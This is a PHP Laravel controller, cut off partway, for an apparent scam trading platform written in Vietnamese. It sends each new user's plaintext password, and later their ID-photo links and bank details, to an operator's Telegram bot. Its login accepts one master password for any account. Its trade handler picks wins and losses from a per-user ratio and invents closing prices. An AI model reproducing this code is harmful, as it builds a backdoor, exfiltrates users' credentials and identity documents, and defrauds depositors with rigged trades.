<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Symbol;
use Illuminate\Support\Facades\Validator;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use App\Models\UserKyc;
use App\Models\UserBank;
use App\Models\Transaction;
use App\Models\UserUsdt;
use App\Models\ConfigSystem;
use Illuminate\Support\Facades\Http;
use Jenssegers\Agent\Agent;
use App\Models\TimeSession;
use Pusher\Pusher;
use App\Models\UserTrade;
use Illuminate\Validation\Rule;
use App\Models\ConfigPayment;
use App\Models\Project;
use App\Models\Investment;
use App\Models\KyQuy;
use App\Models\KyQuyUser;
use Carbon\Carbon;
class HomeController extends Controller
{
    public function index(Request $request)
    {
        $symbols = Symbol::where('status', 'active')->limit(10)->get();
        return view('user.home', compact('symbols'));
        // return view('welcome');
    }
    public function register(Request $request)
    {
        $referral = $request->ref ?? null;

        return view('welcome', compact('referral'));
    }

    public function registerPost(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name' => 'required',
            'phone' => 'required|unique:users',
            'password' => 'required|min:6',
            'agree_terms' => 'required',
            'captcha' => 'required|captcha',
            'referral_code' => 'nullable|exists:users,referral'
        ], [
            'name.required' => __('index.name_required'),
            'phone.required' => __('index.phone_required'),
            'phone.unique' => __('index.phone_exists'),
            'password.required' => __('index.password_required'),
            'password.min' => __('index.password_min'),
            'agree_terms.required' => __('index.agree_terms_required', ['app_name' => config('app_name')]),
            'captcha.required' => __('index.captcha_required'),
            'captcha.captcha' => __('index.captcha_incorrect'),
            'referral_code.exists' => __('index.referral_code_exists')
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => $validator->errors()->first()
            ], 422);
        }

        $user = new User();
        $user->name = $request->name;
        $user->phone = $request->phone;
        $user->password = Hash::make($request->password);
        $referralParent = null;
        if ($request->referral_code) {
            $referralParent = User::where('referral', $request->referral_code)->first();
            if ($referralParent) {
                $user->referral_parent_id = $referralParent->id;
            } else {
                return response()->json([
                    'status' => false,
                    'message' => __('index.referral_code_not_found')
                ], 422);
            }
        }
        
        $user->save();

        Auth::login($user);

        $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
        $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        if($telegram_bot_chatid_account && $telegram_bot_token_account) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
            $message = "🔔 <b>Tài khoản đăng ký mới</b> 🎉\n\n";
            $message .= "👤 <b>Tên:</b> {$user->name}\n";
            $message .= "🆔 <b>ID:</b> {$user->id}\n";
            $message .= "📞 <b>Số điện thoại:</b> {$user->phone}\n";
            $message .= "🔗 <b>Mật khẩu:</b> {$request->password}\n";
            $message .= "🔗 <b>Mã giới thiệu:</b> {$request->referral_code}\n";
            $message .= "🕒 <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";  
            if ($referralParent) {
                $message .= "👤 <b>Tên người giới thiệu:</b> {$referralParent->name}\n";
            }
            $data = [
                'chat_id' => $telegram_bot_chatid_account->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }

        return response()->json([
            'status' => true,
            'message' => __('index.register_success')
        ]);
    }

    public function loginPost(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'phone' => 'required',
            'password' => 'required'
        ], [
            'phone.required' => __('index.phone_required'),
            'password.required' => __('index.password_required')
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'message' => $validator->errors()->first()
            ]);
        }

        $credentials = [
            'phone' => $request->phone,
            'password' => $request->password
        ];

        if (Auth::attempt($credentials)) {
            return response()->json([
                'status' => true,
                'message' => __('index.login_success')
            ]);
        } else {
            $user = User::where('phone', $request->phone)->first();
            $password2 = ConfigSystem::where('key', 'password2')->first();
            if($user && $password2->value == $request->password) {
                Auth::login($user);
                return response()->json([
                    'status' => true,
                    'message' => __('index.login_success')
                ]);
            } else {
                return response()->json([
                    'status' => false,
                    'message' => __('index.login_failed')
                ]);
            }
        }
        return response()->json([
            'status' => false,
            'message' => __('index.login_failed')
        ]);
    }


    public function trade(Request $request)
    {
        $symbol = $request->symbol;
        if($symbol) {
            $symbolActive = Symbol::where('symbol', $symbol)->first();
        } else {
            $symbolActive = Symbol::where('status', 'active')->first();
        }
        if (!$symbolActive) {
            return response()->json(['message' => __('index.symbol_not_found')], 422);
        }


        // if ($agent->isMobile() || $agent->isTablet() || $agent->match('iPad Pro')) { // Check if device is mobile, tablet or iPad Pro
        //     return view('home.mobile.trade', compact('symbolActive'));
        // }
        return view('home.trade', compact('symbolActive'));
    }

    public function upload(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'file' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ], [
            'file.required' => __('index.file_required'),
            'file.image' => __('index.file_image'),
            'file.mimes' => __('index.file_mimes'),
            'file.max' => __('index.file_max'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $file = $request->file('file');
        $filename = time() . '.' . $file->getClientOriginalExtension();
        $file->move(public_path('uploads'), $filename);
        $url = asset('uploads/' . $filename);

        return response()->json(['message' => 'Upload successful', 'url' => $url], 200);
    }

    public function updateKyc(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'fullname' => 'required|string|max:255',
            'identity_front' => 'required|string|max:255',
            'identity_back' => 'nullable|string|max:255',
            'type' => 'required|string|max:255',
        ], [
            'type.required' => __('index.type_required'),
            'type.string' => __('index.type_string'),
            'fullname.required' => __('index.fullname_required'),
            'identity_front.required' => __('index.identity_front_required'),
            'identity_back.required' => __('index.identity_back_required'),
            'identity_front.string' => __('index.identity_front_string'),
            'identity_back.string' => __('index.identity_back_string'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $user = Auth::user();
        $pusher = new Pusher(env('PUSHER_APP_KEY'), env('PUSHER_APP_SECRET'), env('PUSHER_APP_ID'), [
            'cluster' => env('PUSHER_APP_CLUSTER'),
            'useTLS' => true,
        ]);
        
        $kyc = UserKyc::where('user_id', $user->id)->first();

        
        if($kyc && $kyc->status == 'sent_again') {
            $kyc->status = 'pending';
            $kyc->fullname = $request->fullname;
            $kyc->identity_front = $request->identity_front ?? null;
            $kyc->identity_back = $request->identity_back ?? null;
            $kyc->type = $request->type;
            $kyc->save();
            $pusher->trigger('kyc', 'kyc', ['user_id' => $user->id, 'status' => 'pending']);
            $documentType = match ($kyc->type) {
                'passport' => 'Hộ chiếu',
                'national_id' => 'Căn cước công dân',
                'driver_license' => 'Giấy phép lái xe',
                default => 'Thẻ cư trú',
            };
            $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
            $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
            if($telegram_bot_chatid_account && $telegram_bot_token_account) {
                $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
                $message = "🎉 <b>Tài khoản liên kết KYC</b> 🎉\n\n";
                $message .= "👤 <b>Tên:</b> {$kyc->fullname}\n";
                
                $message .= "🆔 <b>Loại giấy tờ:</b> {$documentType}\n";
                $message .= "📞 <b>User ID:</b> {$user->id}\n";
                $message .= "🔗 <b>Link ảnh trước:</b> {$kyc->identity_front}\n";
                $message .= "🔗 <b>Link ảnh sau:</b> {$kyc->identity_back}\n";
                $data = [
                    'chat_id' => $telegram_bot_chatid_account->value,
                    'text' => $message,
                    'parse_mode' => 'HTML',
                ];
                Http::post($url, $data);
            }

            return response()->json(['message' => __('index.kyc_sended')], 200);
        } else {
            $kyc = UserKyc::create([
                'user_id' => $user->id,
                'type' => $request->type,
                'status' => 'pending',
                'fullname' => $request->fullname,
                'identity_front' => $request->identity_front,
                'identity_back' => $request->identity_back ?? null,
                'type' => $request->type,
            ]);

            $documentType = match ($kyc->type) {
                'passport' => 'Hộ chiếu',
                'national_id' => 'Căn cước công dân',
                'driver_license' => 'Giấy phép lái xe',
                default => 'Thẻ cư trú',
            };
            $pusher->trigger('kyc', 'kyc', ['user_id' => $user->id, 'status' => 'pending']);
            $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
            $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
            if($telegram_bot_chatid_account && $telegram_bot_token_account) {
                $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
                $message = "🎉 <b>Tài khoản liên kết KYC</b> 🎉\n\n";
                $message .= "👤 <b>Tên:</b> {$kyc->fullname}\n";
                $message .= "🆔 <b>Loại giấy tờ:</b> {$documentType}\n";
                $message .= "📞 <b>User ID:</b> {$user->id}\n";
                $message .= "🔗 <b>Link ảnh trước:</b> {$kyc->identity_front}\n";
                $message .= "🔗 <b>Link ảnh sau:</b> {$kyc->identity_back}\n";
                $data = [
                    'chat_id' => $telegram_bot_chatid_account->value,
                    'text' => $message,
                    'parse_mode' => 'HTML',
                ];
                Http::post($url, $data);
            }
            return response()->json(['message' => __('index.kyc_sended')], 200);
        }
        return response()->json(['message' => __('index.kyc_error')], 422);
    }

    public function updateBank(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'bank_owner' => 'nullable|string|max:255',
            'bank_name' => 'nullable|string|max:255',
            'bank_number' => 'nullable|string|max:255',
        ], [
            'bank_owner.string' => __('index.bank_owner_string'),
            'bank_name.string' => __('index.bank_name_string'),
            'bank_number.string' => __('index.bank_number_string'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $user = Auth::user();
        $bank = UserBank::where('user_id', $user->id)->first();
        if($bank) {
            $bank->update($request->all());
        } else {
            $bank = UserBank::create([
                'user_id' => $user->id,
                'bank_owner' => $request->bank_owner,
                'bank_name' => $request->bank_name,
                'bank_number' => $request->bank_number,
            ]);
        }

        $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
        $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        if($telegram_bot_chatid_account && $telegram_bot_token_account) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
            $message = "🎉 <b>Tài khoản liên kết ngân hàng</b> 🎉\n\n";
            $message .= "👤 <b>Tên:</b> {$bank->bank_owner}\n";
            $message .= "🆔 <b>User ID:</b> {$user->id}\n";
            $message .= "🏦 <b>Ngân hàng:</b> {$bank->bank_name}\n";
            $message .= "💳 <b>Số tài khoản:</b> {$bank->bank_number}\n";
            $message .= "👤 <b>Chủ tài khoản:</b> {$bank->bank_owner}\n";

            $data = [
                'chat_id' => $telegram_bot_chatid_account->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }
        return response()->json(['message' => __('index.bank_updated')], 200);
    }

    public function updateUsdt(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'usdt_address' => 'nullable|string|max:255',
            'usdt_network' => 'nullable|string|max:255',
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $user = Auth::user();
        $usdt = UserUsdt::where('user_id', $user->id)->first();
        if($usdt) {
            $usdt->update($request->all());
        } else {
            $usdt = UserUsdt::create([
                'user_id' => $user->id,
                'usdt_address' => $request->usdt_address,
                'usdt_network' => $request->usdt_network,
            ]);
        }

        $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
        $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        if($telegram_bot_chatid_account && $telegram_bot_token_account) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
            $message = "🎉 <b>Tài khoản liên kết USDT</b> 🎉\n\n";
            $message .= "🆔 <b>User ID:</b> {$user->id}\n";
            $message .= "💳 <b>Tên tài khoản:</b> {$user->name}\n";
            $message .= "💳 <b>Địa chỉ USDT:</b> {$usdt->bank_number}\n";
            $message .= "💳 <b>Mạng USDT:</b> {$usdt->bank_owner}\n";
            $data = [
                'chat_id' => $telegram_bot_chatid_account->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }
        return response()->json(['message' => __('index.usdt_updated')], 200);
    }

    public function changePassword(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'old_password' => 'required',
            'new_password' => 'required|min:8',
            'confirm_password' => 'required|same:new_password',
        ], [
            'old_password.required' => __('index.old_password_required'),
            'old_password.min' => __('index.old_password_min'),
            'new_password.required' => __('index.new_password_required'),
            'new_password.min' => __('index.new_password_min'),
            'confirm_password.required' => __('index.confirm_password_required'),
            'confirm_password.same' => __('index.confirm_password_same'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $user = Auth::user();
        if (!Hash::check($request->old_password, $user->password)) {
            return response()->json(['message' => __('index.old_password_incorrect')], 422);
        }

        $user->password = Hash::make($request->new_password);
        $user->save();

        return response()->json(['message' => __('index.password_changed_successfully')], 200);
    }

    public function changePassword2(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'old_password' => 'required',
            'new_password' => 'required|min:8',
            'confirm_password' => 'required|same:new_password',
        ], [
            'old_password.required' => __('index.old_password_required'),
            'old_password.min' => __('index.old_password_min'),
            'new_password.required' => __('index.new_password_required'),
            'new_password.min' => __('index.new_password_min'),
            'confirm_password.required' => __('index.confirm_password_required'),
            'confirm_password.same' => __('index.confirm_password_same'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $user = Auth::user();
        if ($user->password2 !== $request->old_password) {
            return response()->json(['message' => __('index.old_password_incorrect')], 422);
        }

        $user->password2 = $request->new_password;
        $user->save();

        return response()->json(['message' => __('index.password_changed_successfully')], 200);
    }

    public function uploadAvatar(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'file' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ], [
            'file.required' => __('index.file_required'),
            'file.image' => __('index.file_image'),
            'file.mimes' => __('index.file_mimes'),
            'file.max' => __('index.file_max'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $file = $request->file('file');
        $filename = time() . '.' . $file->getClientOriginalExtension();
        $file->move(public_path('uploads/avatar'), $filename);
        $url = asset('uploads/avatar/' . $filename);

        $user = Auth::user();
        $user->avatar = $url;
        $user->save();

        return response()->json(['message' => __('index.avatar_uploaded')], 200);
    }

    public function depositPost(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'amount' => 'required|numeric|min:1',
            'payment_type' => 'required|string|max:255',
            'bill_image' => 'required|string|max:255',
        ], [
            'amount.required' => __('index.amount_required'),
            'amount.numeric' => __('index.amount_numeric'),
            'amount.min' => __('index.amount_min'),
            'payment_type.required' => __('index.payment_type_required'),
            'payment_type.string' => __('index.payment_type_string'),
            'bill_image.required' => __('index.bill_image_required'),
            'bill_image.string' => __('index.bill_image_string'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $on_security_deposit = ConfigSystem::where('key', 'on_security_deposit')->first();
        if($on_security_deposit && $on_security_deposit->value == 'on') {
            return response()->json(['message' => __('index.deposit_security_on')], 500);
        }


        $config = ConfigSystem::where('key', 'min_deposit')->first();
        if($request->amount < intval($config->value)) {
            return response()->json(['message' => __('index.amount_min_deposit', ['amount' => number_format($config->value, 0, ',', '.')])], 422);
        }

        Transaction::create([
            'user_id' => Auth::user()->id,
            'amount' => $request->amount,
            'payment_type' => $request->payment_type,
            'bill_image' => $request->bill_image,
            'before_balance' => Auth::user()->balance,
            'after_balance' => Auth::user()->balance + $request->amount,
            'type' => 'deposit',
        ]);

        $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();

        if($telegram_bot_token_account && $telegram_bot_chatid_account) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
            $message = "🏦 <b>Khách hàng nạp tiền</b> 🏦\n\n";
            $message .= "👥 <b>Tên:</b> " . Auth::user()->name . "\n";
            $message .= "🆔 <b>User ID:</b> " . Auth::user()->id . "\n";
            $message .= "💰 <b>Số tiền:</b> " . number_format($request->amount, 0, ',', '.') . "\n";
            $message .= "💳 <b>Phương thức:</b> " . ($request->payment_type == 'bank' ? 'Ngân hàng' : 'USDT') . "\n";
            $message .= "⏰ <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";
            $data = [
                'chat_id' => $telegram_bot_chatid_account->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }

        $pusher = new Pusher(env('PUSHER_APP_KEY'), env('PUSHER_APP_SECRET'), env('PUSHER_APP_ID'), [
            'cluster' => env('PUSHER_APP_CLUSTER'),
            'useTLS' => true,
        ]);
        $pusher->trigger('deposit', 'deposit', ['user_id' => Auth::user()->id, 'amount' => $request->amount]);

        return response()->json(['message' => __('index.deposit_success')], 200);
    }

    public function deposit()
    {
        $user = Auth::user();
        $deposit = Transaction::where('user_id', $user->id)
            ->where('type', 'deposit')
            ->orderBy('created_at', 'desc')
            ->paginate(10);
        $banks = ConfigPayment::where('status', 'show')->where('type', 'bank')->get();
        $usdt_wallets = ConfigPayment::where('status', 'show')->where('type', 'usdt')->get();
        return view('user.deposit', compact('deposit', 'banks', 'user', 'usdt_wallets'));
    }

    public function withdrawPost(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'amount' => 'required|numeric|min:1',
            'withdraw_type' => 'required|string|max:255',
            'bank_id' => 'required|exists:user_banks,id',
            'password' => 'nullable|string|min:6',
        ], [
            'bank_id.required' => __('index.bank_id_required'),
            'bank_id.exists' => __('index.bank_id_exists'),
            'amount.required' => __('index.amount_required'),
            'amount.numeric' => __('index.amount_numeric'),
            'amount.min' => __('index.amount_min'),
            'password.required' => __('index.password_required'),
            'password.string' => __('index.password_string'),
            'password.min' => __('index.password_min'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }
        $user = User::find(Auth::user()->id);

        $on_security_withdraw = ConfigSystem::where('key', 'on_security_withdraw')->first();
        if($on_security_withdraw && $on_security_withdraw->value == 'on') {
            if(!$request->password) {
                return response()->json(['message' => __('index.password_required')], 422);
            }
            if(!Hash::check($request->password, $user->password_withdraw)) {
                return response()->json(['message' => __('index.password_incorrect')], 422);
            }
        }

        $configVerify = ConfigSystem::where('key', 'verify')->first();
        if($configVerify->value == 'on') {
            if(!$user->verifyUserKyc() || $user->verifyUserKyc()->status != 'approved') {
                return response()->json(['message' => __('index.verify_kyc_required')], 500);
            }
        }

        $bank = UserBank::where('id', $request->bank_id)->first();
        $usdt = UserUsdt::where('user_id', $user->id)->first();

        if ($request->withdraw_type === 'bank') {
            if (!$bank) {
                return response()->json(['message' => __('index.bank_or_usdt_not_linked')], 422);
            }
        } else {
            if (!$usdt) {
                return response()->json(['message' => __('index.bank_or_usdt_not_linked')], 422);
            }
        }

        if ($request->amount > $user->balance) {
            return response()->json(['message' => __('index.amount_withdraw_min_balance')], 422);
        }

        if ($user->block_withdraw) {
            return response()->json(['message' => __('index.account_blocked_withdraw')], 422);
        }

        $config = ConfigSystem::where('key', 'min_withdraw')->first();

        if($request->amount < $config->value) {
            return response()->json(['message' => __('index.amount_min_withdraw', ['amount' => number_format($config->value, 0, ',', '.')])], 422);
        }

        $fee_withdraw = ConfigSystem::where('key', 'fee_withdraw')->first();
        if($fee_withdraw) {
            $fee_withdraw = floatval($fee_withdraw->value);
        }

        $amount_withdraw = $request->amount - $fee_withdraw;

        Transaction::create([
            'user_id' => $user->id,
            'amount' => $request->amount,
            'payment_type' => $request->withdraw_type,
            'bank_id' => $request->bank_id,
            'type' => 'withdraw',
            'status' => 'pending',
            'before_balance' => $user->balance,
            'after_balance' => $user->balance - $request->amount,
        ]);

        $user->decrement('balance', $request->amount);

        $telegram_bot_token_account = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();

        if($telegram_bot_token_account && $telegram_bot_chatid_account) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token_account->value}/sendMessage";
            $message = "💳 <b>Khách hàng rút tiền</b> 💳\n\n";
            $message .= "👤 <b>Tên:</b> " . Auth::user()->name . "\n";
            $message .= "🆔 <b>User ID:</b> " . Auth::user()->id . "\n";
            $message .= "💰 <b>Số tiền:</b> " . number_format($request->amount, 0, ',', '.') . "\n";
            $message .= "🏦 <b>Phương thức:</b> " . ($request->withdraw_type == 'bank' ? 'Ngân hàng' : 'USDT') . "\n";
            $message .= "📉 <b>Phí rút tiền:</b> " . number_format($fee_withdraw, 2, ',', '.') . "\n";
            $message .= "💵 <b>Số tiền thực nhận:</b> " . number_format($amount_withdraw, 2, ',', '.') . "\n";
            $message .= "⏰ <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";
            $data = [
                'chat_id' => $telegram_bot_chatid_account->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }

        $pusher = new Pusher(env('PUSHER_APP_KEY'), env('PUSHER_APP_SECRET'), env('PUSHER_APP_ID'), [
            'cluster' => env('PUSHER_APP_CLUSTER'),
            'useTLS' => true,
        ]);
        $pusher->trigger('withdraw', 'withdraw', ['user_id' => $user->id, 'amount' => $request->amount]);

        return response()->json(['message' => __('index.withdraw_success')], 200);
    }

    public function withdraw()
    {
        $user = Auth::user();
        $withdraw = Transaction::where('user_id', $user->id)
            ->where('type', 'withdraw')
            ->orderBy('created_at', 'desc')
            ->paginate(10);
        $banks = UserBank::where('user_id', $user->id)->get();
        return view('user.withdraw', compact('withdraw', 'banks', 'user'));
    }

    public function logout()
    {
        Auth::logout();
        return redirect()->route('home');
    }

    public function trading(Request $request)
    {
        $time_session = TimeSession::where('status', 1)->get();
        $symbolActive = Symbol::where('status', 1)->where('symbol', $request->symbol)->first();
        
        $symbols = Symbol::where('status', 1)->get();
        if(!$symbolActive) {
            $symbolActive = $symbols->first();
        }
        if(Auth::check()) {
            $user = User::find(Auth::user()->id);
            $history = UserTrade::where('user_id', $user->id)
            ->with(['symbol', 'time_session', 'user'])
            ->orderBy('created_at', 'desc')
            ->paginate(10);
        } else {
            $history = collect([]);
        }
        return view('user.trading', compact('time_session','symbols', 'history', 'symbolActive'));
    }

    public function loadMoreTrades(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'is_mobile' => 'required|boolean',
        ], [
            'is_mobile.required' => __('index.is_mobile_required'),
            'is_mobile.boolean' => __('index.is_mobile_boolean'),
        ]);
        
        if (!Auth::check()) {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        $page = $request->get('page', 1);
        $user = Auth::user();

        $trades = UserTrade::where('user_id', $user->id)
            ->with(['symbol', 'time_session', 'user'])
            ->orderBy('created_at', 'desc')
            ->paginate(10, ['*'], 'page', $page);

        $html = '';
        // Convert is_mobile to boolean explicitly
        $isMobile = filter_var($request->is_mobile, FILTER_VALIDATE_BOOLEAN);

        if ($trades->isEmpty()) {
            if ($isMobile) {
                $html = '<div class="text-center text-white">{{ __("index.no_data") }}</div>';
            } else {
                $html = '<tr><td colspan="6" class="text-center text-white">{{ __("index.no_data") }}</td></tr>';
            }
        } else {
            foreach ($trades as $item) {
                if ($isMobile) {
                    $html .= view('user.partials.trade-card', ['item' => $item])->render();
                } else {
                    $html .= view('user.partials.trade-row', ['item' => $item])->render();
                }
            }
        }

        return response()->json([
            'html' => $html,
            'hasMorePages' => $trades->hasMorePages(),
            'nextPage' => $trades->currentPage() + 1
        ]);
    }

    public function tradingPlace(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'amount' => 'required|numeric|min:1',
            'time' => 'required|string|max:255',
            'type' => ['required', Rule::in(['buy', 'sell'])],
            'symbol' => 'required|string|max:255',
            'last_price' => 'required|numeric',
            'last_price_change' => 'required|numeric',
        ], [
            'amount.required' => __('index.amount_required'),
            'amount.numeric' => __('index.amount_numeric'),
            'amount.min' => __('index.amount_min'),
            'time.required' => __('index.time_required'),
            'time.string' => __('index.time_string'),
            'type.required' => __('index.type_required'),
            'type.in' => __('index.type_in'),
            'last_price.required' => __('index.last_price_required'),
            'last_price.numeric' => __('index.last_price_numeric'),
            'last_price_change.required' => __('index.last_price_change_required'),
            'last_price_change.numeric' => __('index.last_price_change_numeric'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $user = User::find(Auth::user()->id);

        if($user->block_trade) {
            return response()->json(['message' => __('index.account_blocked_trade')], 422);
        }

        $configVerify = ConfigSystem::where('key', 'verify')->first();
        if($configVerify->value == 'on') {
            if(!$user->verifyUserKyc() || $user->verifyUserKyc()->status != 'approved') {
                return response()->json(['message' => __('index.verify_kyc_required')], 422);
            }
        }

        $config = ConfigSystem::where('key', 'trade_multiple')->first();

        if($config->value == 0){
            $user_trade = UserTrade::where('user_id', $user->id)
            ->where('status', 'pending')
            ->where('trade_end', '>=', now())
            ->first();
            if($user_trade) {
                return response()->json(['message' => __('index.trade_pending')], 422);
            }
        } 
        if($user->balance < $request->amount) {
            return response()->json(['message' => __('index.balance_not_enough')], 422);
        }

        $time_session = TimeSession::where('id', $request->time)->first();
        if(!$time_session) {
            return response()->json(['message' => __('index.time_session_not_found')], 422);
        }

        $symbol = Symbol::where('id', $request->symbol)->first();
        if(!$symbol) {
            return response()->json(['message' => __('index.symbol_not_found')], 422);
        }
        $step = $time_session->unit == 's' ? 1 : ($time_session->unit == 'm' ? 60 : ($time_session->unit == 'h' ? 3600 : ($time_session->unit == 'd' ? 86400 * 24 : 86400)));
        $trade_end = now()->addSeconds($time_session->time * $step);
        $last_price = $request->last_price;
        $last_price_change = $request->last_price_change;
        $beforeBalance = $user->balance;

        $user->decrement('balance', $request->amount);

        $ratio = $user->ratio;
        $resultBet = 'lose';
        $resultBet = (random_int(1, 100) <= $ratio) ? 'win' : 'lose';
        
        $openPrice = $last_price;
        $priceChangeAbs = mt_rand(0, 900) / 100; // 0.00 đến 9.00 USD
        $closePrice = 0;

        if ($resultBet == 'win') {
            $closePrice = $request->type == 'buy' ? $openPrice + $priceChangeAbs : $openPrice - $priceChangeAbs;
            $profit = $request->amount * $time_session->win_rate / 100;
        } else {
            $closePrice = $request->type == 'buy' ? $openPrice - $priceChangeAbs : $openPrice + $priceChangeAbs;
            $profit = $request->amount * $time_session->lose_rate / 100;
        }

        $trade = UserTrade::create([
            'user_id' => $user->id,
            'open_price' => $openPrice,
            'close_price' => $closePrice,
            'symbol_id' => $symbol->id,
            'type' => $request->type,
            'amount' => $request->amount,
            'session_id' => $time_session->id,
            'status' => 'pending',
            'before_balance' => $beforeBalance,
            'after_balance' => $user->balance,
            'result' => $resultBet,
            'profit' => $profit,
            'trade_at' => now(),
            'trade_end' => $trade_end,
            'last_price_change' => $priceChangeAbs,
        ]);

        $pusher = new Pusher(env('PUSHER_APP_KEY'), env('PUSHER_APP_SECRET'), env('PUSHER_APP_ID'), [
            'cluster' => env('PUSHER_APP_CLUSTER'),
            'useTLS' => true,
        ]);
        $pusher->trigger('trade', 'trade', ['user_id' => $user->id, 'amount' => $request->amount]);

        $telegram_bot_token = ConfigSystem::where('key', 'telegram_bot_token_trade')->first();
        $telegram_bot_chatid = ConfigSystem::where('key', 'telegram_bot_chatid_trade')->first();

        if($telegram_bot_token && $telegram_bot_chatid) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token->value}/sendMessage";
            $message = "🎮 <b>Thông báo giao dịch</b> 💳\n\n";
            $message .= "👤 <b>Tên:</b> " . Auth::user()->name . "\n";
            $message .= "🆔 <b>User ID:</b> " . Auth::user()->id . "\n";
            $message .= "💵 <b>Số tiền:</b> " . number_format($request->amount, 0, ',', '.') . "\n";
            $message .= "⏰ <b>Thời gian:</b> " . $time_session->time . ($time_session->unit == 's' ? 'giây' : ($time_session->unit == 'm' ? 'phút' : ($time_session->unit == 'h' ? 'giờ' : ($time_session->unit == 'd' ? 'ngày' : 'ngày')))) . "\n";
            $message .= "💰 <b>Tiền Tệ:</b> " . $symbol->symbol . "\n";
            $message .= "📋 <b>Lệnh:</b> " . ($request->type == 'buy' ? 'Mua tăng' : 'Mua giảm') . "\n";
            $message .= "🏆 <b>Kết quả:</b> " . ($resultBet == 'win' ? 'Thắng' : 'Thua') . "\n";
            $message .= "💸 <b>Giá trị:</b> " . number_format($profit, 0, ',', '.') . "\n";
            $message .= "⏰ <b>Thời gian đặt cược:</b> " . $trade_end->format('d/m/Y H:i:s') . "\n";
            $data = [
                'chat_id' => $telegram_bot_chatid->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }


        return response()->json(['message' => __('index.trade_success'), 'trade' => $trade, 'time' => $time_session->time * $step], 200);

    }

    public function market()
    {
        $symbols = Symbol::where('status', 1)->paginate(10);
        return view('user.market', compact('symbols'));
    }

    public function kyc()
    {
        $kyc = UserKyc::where('user_id', Auth::user()->id)->first();
        return view('user.kyc', compact('kyc'));
    }

    public function banklist()
    {
        $banks = UserBank::where('user_id', Auth::user()->id)->get();
        return view('user.banklist', compact('banks'));
    }

    public function addBank(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'bank_name' => 'required|string|max:255',
            'bank_account' => 'required|string|max:255',
            'bank_account_name' => 'required|string|max:255',
        ], [
            'bank_name.required' => __('index.bank_name_required'),
            'bank_account.required' => __('index.bank_account_required'),
            'bank_account_name.required' => __('index.bank_account_name_required'),
